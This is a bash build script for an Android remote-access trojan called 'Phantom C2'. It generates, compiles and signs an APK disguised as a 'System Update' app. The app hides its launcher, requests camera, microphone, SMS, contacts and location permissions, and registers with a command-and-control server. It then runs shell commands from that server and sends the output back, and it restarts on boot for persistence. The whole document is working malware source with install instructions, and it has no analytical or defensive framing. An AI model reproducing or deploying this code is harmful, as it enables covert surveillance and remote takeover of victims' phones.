#!/bin/bash
# Phantom C2 — Android APK Builder
# Run this on the Mac where Android Studio SDK is installed
# Usage: bash build_apk.sh

set -e

C2_URL="http://192.168.1.72:8080"
APP_NAME="SystemUpdate"
PKG="com.android.systemupdate"
SDK="$HOME/Library/Android/sdk"
BUILD_TOOLS=$(ls -d "$SDK/build-tools/"* 2>/dev/null | sort -V | tail -1)
PLATFORM=$(ls -d "$SDK/platforms/android-"* 2>/dev/null | sort -V | tail -1)

echo "[*] SDK: $SDK"
echo "[*] Build Tools: $BUILD_TOOLS"
echo "[*] Platform: $PLATFORM"

if [ -z "$BUILD_TOOLS" ] || [ -z "$PLATFORM" ]; then
    echo "[-] Android SDK not found. Install via Android Studio."
    exit 1
fi

WORK=$(mktemp -d)
echo "[*] Working in: $WORK"

# Create project structure
mkdir -p "$WORK/src/com/android/systemupdate"
mkdir -p "$WORK/res/layout"
mkdir -p "$WORK/res/values"

# AndroidManifest.xml
cat > "$WORK/AndroidManifest.xml" << 'MANIFEST'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.android.systemupdate">
    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="29"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <application
        android:label="System Update"
        android:allowBackup="true"
        android:usesCleartextTraffic="true">
        <activity android:name=".MainActivity" android:exported="true"
            android:theme="@android:style/Theme.NoDisplay">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <service android:name=".PhantomService" android:exported="false"/>
        <receiver android:name=".BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
MANIFEST

# Main Activity — starts FOREGROUND service and hides
cat > "$WORK/src/com/android/systemupdate/MainActivity.java" << 'JAVA'
package com.android.systemupdate;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle saved) {
        super.onCreate(saved);
        Intent svc = new Intent(this, PhantomService.class);
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(svc);
        } else {
            startService(svc);
        }
        finish();
    }
}
JAVA

# Background Service — C2 callback loop (foreground to survive Android 8+ limits)
cat > "$WORK/src/com/android/systemupdate/PhantomService.java" << JAVA
package com.android.systemupdate;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import java.io.*;
import java.net.*;

public class PhantomService extends Service {
    private static final String C2 = "${C2_URL}";
    private static final String TAG = "PhantomSvc";
    private static final String CHANNEL_ID = "sys_update_ch";
    private volatile boolean running = true;

    @Override
    public void onCreate() {
        super.onCreate();
        // Create notification channel (required API 26+)
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID, "System Updates",
                NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            ch.setSound(null, null);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Promote to foreground immediately so Android doesn't kill us
        Notification.Builder nb;
        if (Build.VERSION.SDK_INT >= 26) {
            nb = new Notification.Builder(this, CHANNEL_ID);
        } else {
            nb = new Notification.Builder(this);
        }
        nb.setContentTitle("System Update")
          .setContentText("Checking for updates...")
          .setSmallIcon(android.R.drawable.stat_sys_download)
          .setPriority(Notification.PRIORITY_MIN)
          .setOngoing(true);
        startForeground(1, nb.build());
        Log.i(TAG, "Foreground service started, C2: " + C2);

        new Thread(() -> {
            String agentId = "";
            String agentName = "";

            while (running) {
                try {
                    // First call = register, subsequent = checkin
                    String endpoint;
                    String body;

                    if (agentId.isEmpty()) {
                        endpoint = C2 + "/api/v1/mobile/register";
                        body = "{" +
                            "\"hostname\":\"" + Build.MODEL + "\"," +
                            "\"username\":\"" + Build.MANUFACTURER + "\"," +
                            "\"os\":\"android\"," +
                            "\"arch\":\"" + Build.SUPPORTED_ABIS[0] + "\"," +
                            "\"device_id\":\"" + Build.SERIAL + "\"," +
                            "\"manufacturer\":\"" + Build.MANUFACTURER + "\"," +
                            "\"product\":\"" + Build.PRODUCT + "\"," +
                            "\"os_version\":\"" + Build.VERSION.RELEASE + "\"" +
                        "}";
                        Log.i(TAG, "Registering with C2: " + endpoint);
                    } else {
                        endpoint = C2 + "/api/v1/mobile/checkin";
                        body = "{\"agent_id\":\"" + agentId + "\"}";
                        Log.d(TAG, "Checking in: " + agentName);
                    }

                    URL url = new URL(endpoint);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setRequestProperty("User-Agent", "Android/" + Build.VERSION.RELEASE);
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(10000);
                    conn.getOutputStream().write(body.getBytes());

                    int code = conn.getResponseCode();
                    Log.i(TAG, "C2 responded: " + code);

                    if (code == 200) {
                        BufferedReader br = new BufferedReader(
                            new InputStreamReader(conn.getInputStream()));
                        StringBuilder sb = new StringBuilder();
                        String line;
                        while ((line = br.readLine()) != null) sb.append(line);
                        br.close();
                        String resp = sb.toString();
                        Log.d(TAG, "Response: " + resp);

                        // Parse agent_id from registration response
                        if (agentId.isEmpty() && resp.contains("agent_id")) {
                            int idx = resp.indexOf("\"agent_id\":\"");
                            if (idx > 0) {
                                String sub = resp.substring(idx + 12);
                                agentId = sub.substring(0, sub.indexOf("\""));
                                Log.i(TAG, "Registered as: " + agentId);
                            }
                            int nIdx = resp.indexOf("\"name\":\"");
                            if (nIdx > 0) {
                                String sub = resp.substring(nIdx + 8);
                                agentName = sub.substring(0, sub.indexOf("\""));
                                Log.i(TAG, "Agent name: " + agentName);
                            }
                        }

                        // Execute any tasks from checkin response
                        if (resp.contains("\"type\":\"shell\"")) {
                            // Find command field
                            int cIdx = resp.indexOf("\"command\":\"");
                            if (cIdx > 0) {
                                String sub = resp.substring(cIdx + 11);
                                String cmd = sub.substring(0, sub.indexOf("\""));
                                Log.i(TAG, "Executing: " + cmd);

                                Process p = Runtime.getRuntime().exec(
                                    new String[]{"/system/bin/sh", "-c", cmd});
                                BufferedReader pr = new BufferedReader(
                                    new InputStreamReader(p.getInputStream()));
                                StringBuilder out = new StringBuilder();
                                while ((line = pr.readLine()) != null)
                                    out.append(line).append("\\n");
                                pr.close();
                                // Also capture stderr
                                BufferedReader er = new BufferedReader(
                                    new InputStreamReader(p.getErrorStream()));
                                while ((line = er.readLine()) != null)
                                    out.append(line).append("\\n");
                                er.close();

                                String taskId = "";
                                int tIdx = resp.indexOf("\"id\":\"");
                                if (tIdx > 0) {
                                    String tsub = resp.substring(tIdx + 6);
                                    taskId = tsub.substring(0, tsub.indexOf("\""));
                                }

                                // Send result via checkin
                                String cleanOut = out.toString()
                                    .replace("\\\\", "\\\\\\\\")
                                    .replace("\"", "\\\\\"")
                                    .replace("\\n", "\\\\n")
                                    .replace("\\r", "\\\\r")
                                    .replace("\\t", "\\\\t");
                                String result = "{\"agent_id\":\"" + agentId +
                                    "\",\"results\":[{\"task_id\":\"" + taskId +
                                    "\",\"output\":\"" + cleanOut +
                                    "\"}]}";
                                URL resUrl = new URL(C2 + "/api/v1/mobile/checkin");
                                HttpURLConnection rc = (HttpURLConnection) resUrl.openConnection();
                                rc.setRequestMethod("POST");
                                rc.setRequestProperty("Content-Type", "application/json");
                                rc.setDoOutput(true);
                                rc.getOutputStream().write(result.getBytes());
                                rc.getResponseCode();
                                rc.disconnect();
                                Log.i(TAG, "Result sent for task " + taskId);
                            }
                        }
                    }
                    conn.disconnect();
                } catch (Exception e) {
                    Log.e(TAG, "Callback error: " + e.getMessage());
                }

                try { Thread.sleep(10000); } catch (Exception e) {}
            }
        }).start();
        return START_STICKY;
    }

    @Override
    public void onDestroy() { running = false; super.onDestroy(); }

    @Override
    public IBinder onBind(Intent i) { return null; }
}
JAVA

# Boot Receiver — persistence
cat > "$WORK/src/com/android/systemupdate/BootReceiver.java" << 'JAVA'
package com.android.systemupdate;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        ctx.startService(new Intent(ctx, PhantomService.class));
    }
}
JAVA

# res/values/strings.xml
cat > "$WORK/res/values/strings.xml" << 'XML'
<?xml version="1.0" encoding="utf-8"?>
<resources><string name="app_name">System Update</string></resources>
XML

# Compile
echo "[*] Compiling R.java..."
"$BUILD_TOOLS/aapt" package -f -m \
    -J "$WORK/src" \
    -M "$WORK/AndroidManifest.xml" \
    -S "$WORK/res" \
    -I "$PLATFORM/android.jar"

echo "[*] Compiling Java..."
find "$WORK/src" -name "*.java" > "$WORK/sources.txt"
javac -source 1.8 -target 1.8 \
    -classpath "$PLATFORM/android.jar" \
    -d "$WORK/classes" \
    @"$WORK/sources.txt" 2>&1 || mkdir -p "$WORK/classes"

echo "[*] Creating DEX..."
"$BUILD_TOOLS/d8" --release \
    --lib "$PLATFORM/android.jar" \
    --output "$WORK" \
    $(find "$WORK/classes" -name "*.class") 2>&1

echo "[*] Building APK..."
"$BUILD_TOOLS/aapt" package -f \
    -M "$WORK/AndroidManifest.xml" \
    -S "$WORK/res" \
    -I "$PLATFORM/android.jar" \
    -F "$WORK/unsigned.apk"

# Add DEX to APK
cd "$WORK" && "$BUILD_TOOLS/aapt" add "$WORK/unsigned.apk" classes.dex

echo "[*] Signing APK..."
# Create debug keystore if it doesn't exist
if [ ! -f ~/.android/debug.keystore ]; then
    keytool -genkey -v -keystore ~/.android/debug.keystore \
        -storepass android -alias androiddebugkey -keypass android \
        -keyalg RSA -keysize 2048 -validity 10000 \
        -dname "CN=Android Debug,O=Android,C=US"
fi

"$BUILD_TOOLS/apksigner" sign \
    --ks ~/.android/debug.keystore \
    --ks-pass pass:android \
    --key-pass pass:android \
    --out "$WORK/phantom.apk" \
    "$WORK/unsigned.apk"

# Copy to Desktop
cp "$WORK/phantom.apk" /tmp/phantom.apk
echo ""
echo "[+] APK ready: /tmp/phantom.apk"
echo "[*] Install: adb install /tmp/phantom.apk"
echo "[*] Launch:  adb shell am start -n com.android.systemupdate/.MainActivity"
echo "[*] The app starts a hidden background service that calls back to: ${C2_URL}"

